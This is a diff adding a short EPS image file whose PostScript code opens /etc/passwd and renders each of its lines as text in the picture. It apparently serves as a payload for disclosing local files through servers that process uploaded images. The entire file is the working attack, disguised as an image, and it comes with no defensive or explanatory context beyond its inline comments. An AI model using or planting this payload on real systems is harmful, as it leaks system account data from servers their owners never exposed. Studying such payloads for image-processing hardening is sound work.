@@ -1,0 +1,24 @@
+%!PS-Adobe-2.0 EPSF-2.0
+%%BoundingBox: 0 0 500 500
+
+/stdin (/etc/passwd) (r) file def %opens the file and defs it to the stdin word
+/buffer 128 string def %allocates the string and defs it to the buffer word
+/println {print (\n) print flush} def %it's just nice to be able to print a whole line
+/userread {stdin buffer readline} def %also nice to read from stdin in one word
+/pt {72 div} def
+/y 9 def
+/yd {y 14 pt sub /y exch def} def
+/textdraw {/Helvetica findfont 12 pt scalefont setfont 8 pt y moveto show} def
+72 72 scale
+0 0 0 setrgbcolor
+{
+	userread {
+		dup println
+		textdraw
+		yd
+	} 
+	{ exit
+	} ifelse
+}
+loop
+pop
